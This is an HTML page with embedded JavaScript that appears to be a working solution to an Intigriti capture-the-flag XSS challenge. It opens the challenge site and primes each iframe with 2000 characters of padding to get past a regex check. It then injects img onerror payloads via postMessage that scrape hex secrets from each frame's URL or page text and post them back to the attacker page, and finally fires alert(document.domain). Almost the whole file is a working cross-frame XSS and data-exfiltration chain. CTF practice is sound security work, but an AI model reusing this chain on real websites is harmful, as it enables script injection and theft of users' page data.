<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Exploit</title>
</head>
<body>
    <h1>Challenge Solver (Fixed)</h1>
    <p>Click the button to start the exploit chain.</p>
    <button id="btn" style="font-size:20px; padding:15px;">Launch Exploit</button>
    <h3>Log:</h3>
    <pre id="log" style="background:#f0f0f0; padding:10px;"></pre>

    <script>
        let stolenStones = {};
        let targetWin = null;

        // 1. Listen for the stolen pieces coming back from the Stones
        window.addEventListener('message', (event) => {
            if (event.data.type === 'stone_collected') {
                log(`[SUCCESS] Collected Stone ${event.data.index}: ${event.data.secret}`);
                stolenStones[event.data.index] = event.data.secret;
                checkAndSnap();
            }
        });

        document.getElementById('btn').addEventListener('click', () => {
            // Open the target in a new tab
            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
            log("Target opened... waiting 4 seconds for load...");
            
            // Wait for the target to fully load everything
            setTimeout(attackAllStones, 4000);
        });

        function attackAllStones() {
            log("Attacking Stones...");
            for (let i = 0; i < 6; i++) {
                sendExploit(i);
            }
        }

        function sendExploit(index) {
            // Check if window is still open
            if(!targetWin) { log("Target window lost!"); return; }
            
            let targetFrame = targetWin.frames[index];

            // --- STEP 1: THE PRIMER ---
            // HUGE PADDING FIX: We use 2000 characters to ensure 
            // the regex 'lastIndex' jumps way past our actual payload length.
            const padding = "A".repeat(2000); 
            targetFrame.postMessage(padding + "<", '*');

            // --- STEP 2: THE PAYLOAD ---
            // The script runs inside the iframe.
            // FIX: We use 'window.top.opener' to talk back to this exploit page.
            const extractorScript = `
                var secret = "";
                
                // Strategy A: URL (Works for most stones)
                var match = location.search.match(/=[a-f0-9]{8}/);
                if(match) secret = match[0].substring(1);
                
                // Strategy B: DOM Scan (Needed for Space Stone which has no URL param)
                if(!secret) {
                    // Look for any 8-char hex string in the body
                    var bodyText = document.body.innerText || "";
                    var hexMatch = bodyText.match(/[a-f0-9]{8}/);
                    if(hexMatch) secret = hexMatch[0];
                }

                // Send back to the Exploit Page (window.top.opener)
                if(window.top && window.top.opener) {
                    window.top.opener.postMessage({type: 'stone_collected', index: ${index}, secret: secret}, '*');
                }
            `;

            // Wrap in image tag
            const payload = `<img src=x onerror="${extractorScript}">`;
            
            // Send payload immediately
            targetFrame.postMessage(payload, '*');
        }

        function checkAndSnap() {
            // Do we have all 6 pieces? (Indices 0-5)
            // We check the length of keys in our object
            if (Object.keys(stolenStones).length >= 6) {
                
                // Reassemble Code based on correct order
                // DOM Order: 0:Power, 1:Reality, 2:Soul, 3:Space, 4:Time, 5:Mind
                // Code Order: Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
                
                const fullCode = 
                    stolenStones[0] + 
                    stolenStones[5] + 
                    stolenStones[1] + 
                    stolenStones[3] + 
                    stolenStones[2] + 
                    stolenStones[4];

                log("FULL CODE ASSEMBLED: " + fullCode);

                // --- FINAL ATTACK ---
                // Send the command to the Main Page using one of the stones (Soul/Index 2)
                const killPayload = `<img src=x onerror="parent.postMessage('${fullCode}' + 'alert(document.domain)', '*')">`;
                
                // Reprime and Fire
                const padding = "A".repeat(2000);
                targetWin.frames[2].postMessage(padding + "<", '*');
                targetWin.frames[2].postMessage(killPayload, '*');
                
                log("Final payload sent! Check the other tab for the alert.");
            }
        }

        function log(msg) {
            document.getElementById('log').innerText += msg + "\n";
            console.log(msg);
        }
    </script>
</body>
</html>
